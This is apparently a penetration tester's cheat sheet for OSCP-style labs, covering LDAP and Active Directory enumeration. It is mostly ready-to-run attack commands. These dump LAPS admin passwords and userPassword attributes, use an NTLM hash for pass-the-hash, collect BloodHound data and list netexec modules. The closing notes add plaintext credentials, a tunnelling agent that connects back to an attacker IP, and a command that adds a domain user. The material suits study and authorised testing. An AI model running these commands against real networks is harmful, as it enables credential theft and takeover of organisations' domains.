## 🧬 LDAP & Active Directory Enumeration

Based on [HackTricks - Pentesting LDAP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html)

---

### 🔍 Nmap LDAP Enumeration

```
nmap -v -p 389,636,3268,3269 -oN ldap-nmap.txt -d --script "ldap* and not brute" 192.168.102.227
```

---

### 🧾 Anonymous LDAP Search (Unauthenticated)

#### Windapsearch (AD users enumeration)

```
windapsearch --dc DC_IP_ADDDR --domain offsec -m users --full | tee ldap-windapsearch-users.txt
```

```
windapsearch -u hacker -p 'Tuesday@2' --dc DC_IP_ADDDR --domain offsec -m users --full | tee ldap-windapsearch-users.txt
```

```
windapsearch -u tom_admin --hash '4979d69d4ca66955c075c41cf45f24dc' --dc DC_IP_ADDDR --domain offsec -m users --full | tee ldap-windapsearch-users.txt
```

#### ldapsearch – all users and selected attributes

```
ldapsearch -x -H ldap://192.168.102.227 -b "DC=offsec,DC=exam" "(objectClass=user)"
```

```
ldapsearch -x -H ldap://192.168.102.227 -b "DC=offsec,DC=exam" "(objectClass=user)" description
```

```
ldapsearch -x -H ldap://192.168.102.227 -D "hacker@oscp.exam" -w 'Tuesday@2' -b "DC=oscp,DC=exam" "(objectClass=user)"
```
#### Enumerate full schema from root DSE (very verbose)

```
ldapsearch -H ldaps://offsec.exam:636/ -x -s base -b '' "(objectClass=*)" "*" +
```

#### Anonymous dump and anomaly patterning

```
ldapsearch -x -H ldap://192.168.102.227 -D '' -w '' -b "DC=offsec,DC=exam" -v | tee ldapsearch-initial.txt
```

```
ldapsearch -x -H ldap://192.168.102.227 -b "DC=offsec,DC=exam" "(objectClass=user)" > ldap-users-raw.txt cat ldap-users-raw.txt | awk '{print $1}' | sort | uniq -c | sort -n
```

---

### 🔐 LDAP Search with Credentials

#### Search for LAPS Password (ms-MCS-AdmPwd)

```
ldapsearch -v -x -D "hacker@offsec.exam" -w "Tuesday@2" -H ldap://192.168.102.227 -b "DC=offsec,DC=exam" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

#### Alternative full LAPS dump

```
ldapsearch -v -x -D "hacker@offsec.exam" -w "Tuesday@2" -H ldap://192.168.102.227 -b "DC=offsec,DC=exam" "(ms-MCS-AdmPwd=*)"
```

---

### 🧰 netexec (nxc) LDAP Modules

#### Check for LAPS enabled
```
nxc ldap 192.168.102.227 -u hacker -p 'Tuesday@2' -M laps
```

#### Check for ADCS enabled
```
nxc ldap 192.168.102.227 -u hacker -p 'Tuesday@2' -M adcs
```

#### Get Domain SID
```
nxc ldap 192.168.102.227 -u hacker -p 'Tuesday@2' --get-sid
```

---

### 🧠 BloodHound Collection
#### BloodHound via NetExec (stealthy Python version)
```
nxc ldap offsec.exam -u hacker -p 'Tuesday@2' --bloodhound -c all --dns-server 192.168.102.227
```

#### BloodHound via NetExec (quick & light)
```
nxc ldap 192.168.102.227 -u hacker -p 'Tuesday@2' --bloodhound --collection ALL --dns-server 192.168.102.227
```

----

## NXC LDap commands 

## NetExec LDAP Modules: Checklist with Descriptions and Commands

Below is a list of NetExec (`nxc`) LDAP modules with a one-line summary of each and ready-to-use commands formatted for checklist usage.

---

### ✅ adcs

**Description:** Enumerate ADCS (Active Directory Certificate Services) enrollment services.

```bash
nxc ldap <target> -u <user> -p <pass> -M adcs
```

### ✅ badsuccessor

**Description:** Check for vulnerability to the BadSuccessor DMSA attack.

```bash
nxc ldap <target> -u <user> -p <pass> -M badsuccessor
```

### ✅ daclread

**Description:** Read the DACL (Discretionary Access Control List) of AD objects.

```bash
nxc ldap <target> -u <user> -p <pass> -M daclread -o TARGET=Administrator ACTION=read
```

### ✅ dump-computers

**Description:** Dump all computers listed in Active Directory.

```bash
nxc ldap <target> -u <user> -p <pass> -M dump-computers
```

### ✅ entra-id

**Description:** Search for Microsoft Entra ID (Azure AD) sync server.

```bash
nxc ldap <target> -u <user> -p <pass> -M entra-id
```

### ✅ find-computer

**Description:** Search for computers matching a keyword in the domain.

```bash
nxc ldap <target> -u <user> -p <pass> -M find-computer -o TEXT=dc01
```

### ✅ get-desc-users

**Description:** Fetch AD user descriptions, which may contain credentials.

```bash
nxc ldap <target> -u <user> -p <pass> -M get-desc-users
```

### ✅ get-info-users

**Description:** Get the 'info' attribute for AD users; may leak secrets.

```bash
nxc ldap <target> -u <user> -p <pass> -M get-info-users
```

### ✅ get-network

**Description:** Dump internal DNS records via LDAP.

```bash
nxc ldap <target> -u <user> -p <pass> -M get-network
```

### ✅ get-unixUserPassword

**Description:** Dump `unixUserPassword` attributes from LDAP.

```bash
nxc ldap <target> -u <user> -p <pass> -M get-unixUserPassword
```

### ✅ get-userPassword

**Description:** Dump `userPassword` attributes from LDAP.

```bash
nxc ldap <target> -u <user> -p <pass> -M get-userPassword
```

### ✅ groupmembership

**Description:** Show group memberships for a user.

```bash
nxc ldap <target> -u <user> -p <pass> -M groupmembership -o USER=hacker
```

### ✅ laps

**Description:** Query for LAPS (Local Admin Password Solution) secrets.

```bash
nxc ldap <target> -u <user> -p <pass> -M laps
```

### ✅ maq

**Description:** Get the MachineAccountQuota attribute.

```bash
nxc ldap <target> -u <user> -p <pass> -M maq
```

### ✅ obsolete

**Description:** Identify obsolete hosts (unsupported OS versions).

```bash
nxc ldap <target> -u <user> -p <pass> -M obsolete
```

### ✅ pre2k

**Description:** Identify pre-Windows 2000 computer accounts.

```bash
nxc ldap <target> -u <user> -p <pass> -M pre2k
```

### ✅ pso

**Description:** Retrieve Fine Grained Password Policies (FGPPs)

---

# Notes on LDAP

example output 

```
┌──(kali㉿kali)-[~/TMP-CMD-CHk]
└─$ ldapsearch -x -H ldap://192.168.102.227 -D "hacker@oscp.exam" -w 'Tuesday@2' -x -s base -b '' "(objectClass=*)" "*" + 

# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectClass=*)
# requesting: * + 
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=oscp,DC=exam
ldapServiceName: oscp.exam:dc01$@OSCP.EXAM
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=oscp,DC=exam
serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur
 ation,DC=oscp,DC=exam
schemaNamingContext: CN=Schema,CN=Configuration,DC=oscp,DC=exam
namingContexts: DC=oscp,DC=exam
namingContexts: CN=Configuration,DC=oscp,DC=exam
namingContexts: CN=Schema,CN=Configuration,DC=oscp,DC=exam
namingContexts: DC=ForestDnsZones,DC=oscp,DC=exam
namingContexts: DC=DomainDnsZones,DC=oscp,DC=exam
isSynchronized: TRUE
highestCommittedUSN: 102517
dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,
 CN=Sites,CN=Configuration,DC=oscp,DC=exam
dnsHostName: DC01.oscp.exam
defaultNamingContext: DC=oscp,DC=exam
currentTime: 20251114191201.0Z
configurationNamingContext: CN=Configuration,DC=oscp,DC=exam

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

┌──(kali㉿kali)-[~/TMP-CMD-CHk]
└─$ 

```

## 🔐 `supportedSASLMechanisms`

These list the **authentication methods** the LDAP server supports via **SASL (Simple Authentication and Security Layer)**.

|Mechanism|What It Is|Relevance|
|---|---|---|
|`GSSAPI`|Kerberos (via SPNEGO)|Can be used for domain-authenticated binds (e.g., with `kinit`)|
|`GSS-SPNEGO`|Kerberos + NTLM fallback|SPNEGO is used in modern AD logins (e.g., Windows SSO)|
|`DIGEST-MD5`|Challenge/response method|Rarely used, weak, mostly legacy|
|`EXTERNAL`|Cert-based auth (e.g., TLS)|Only applicable if using certs and client TLS setup|

> 🔍 **Why it matters:**  
> If `GSSAPI` is present, and you later get valid domain credentials or a TGT (via `kinit`), you can authenticate with Kerberos instead of simple binds — great for stealth or password-less enumeration.

---

## 🧠 `supportedLDAPPolicies`

These are server-side **directory operation policies**, kind of like LDAP’s internal sysctl limits.

|Policy|What It Controls|
|---|---|
|`MaxPageSize`|Maximum entries per paged search (important for `ldapsearch -E pr=500`)|
|`MaxDirSyncDuration`|Time limit for a directory sync operation|
|`ThreadMemoryLimit`|Per-thread memory allocation|
|`MaxResultSetSize`|Cap on result size before LDAP returns an error|
|`SystemMemoryLimitPercent`|Memory guardrails, system-wide|
|`MaxConnections`|Max concurrent LDAP connections allowed|

> 🔍 **Why it matters:**  
> You’re unlikely to abuse these directly, but they explain why large queries (e.g., dumping 10K users) may stop prematurely. Tools like BloodHound, SharpHound, or paged LDAP queries depend on respecting these limits.

---

## 🎛 `supportedControl`

These are **LDAP protocol extensions** the server understands. They're all defined by OIDs — object identifiers — but here are the important ones decoded:

|OID|Meaning|Use Case|
|---|---|---|
|`1.2.840.113556.1.4.319`|Paged Results|Used to split large queries into pages (e.g. `-E pr=500`)|
|`1.2.840.113556.1.4.417`|Show Deleted|Allows access to tombstoned/deleted objects (recycle bin)|
|`1.2.840.113556.1.4.801`|DirSync|Lets you replicate changes since a given state (BloodHound uses this)|
|`1.2.840.113556.1.4.805`|Tree Delete|Allows deletion of entire subtrees|
|`1.2.840.113556.1.4.521`|VLV (Virtual List View)|Enables precise paginated scrolls (used with Server Side Sorting)|
|`2.16.840.1.113730.3.4.10`|Account usability (Netscape)|Tells whether an account is locked/expired|
|`1.2.840.113556.1.4.2026`|SD Flags Control|Retrieves security descriptor details (DACLs, owner, etc.)|

> 🔍 **Why it matters:**  
> Pentesting tools use these controls under the hood. For example:

- BloodHound uses `DirSync`
    
- ADRecycleBin recon uses `Show Deleted`
    
- Large data dumps need `Paged Results` to avoid hitting `MaxPageSize`
    

If any of these controls **aren’t supported**, those tools may fail or need fallback behavior.

---

## 🏛 `domainFunctionality`, `forestFunctionality`, `domainControllerFunctionality`

These are **functional levels**, and they define what features are available in the domain or forest. Higher numbers = newer = more security + features.

|Value|Windows Version|Meaning|
|---|---|---|
|`2`|Windows Server 2003|Legacy, minimal|
|`3`|Windows Server 2008||
|`4`|Windows Server 2008 R2||
|`5`|Windows Server 2012||
|`6`|Windows Server 2016||
|`7`|Windows Server 2019+||

> 🔍 **Why it matters:**

- 🟢 **Functional level 7** means the domain is modern – no legacy tech like LM hashing
    
- 🔒 May disable NTLM fallback or restrict older authentication methods
    
- 🧪 Some privilege escalation paths or GPO abuse tactics depend on older levels (e.g., unconstrained delegation tricks)

---
  
```
Eric.Wallows / EricLikesRunning800
```

```
sudo ./proxy -selfcert -laddr 0.0.0.0:4443
```

```
agent.exe -connect 192.168.45.248:4443 -ignore-cert
```

```
tom_admin : 4979d69d4ca66955c075c41cf45f24dc
```

```
192.168.102.227
```

```
net user hacker Tuesday@2 /add /domain
```

```
ldapsearch -x -H ldap://192.168.102.227 -b "DC=offsec,DC=exam" "(objectClass=user)" description
```
  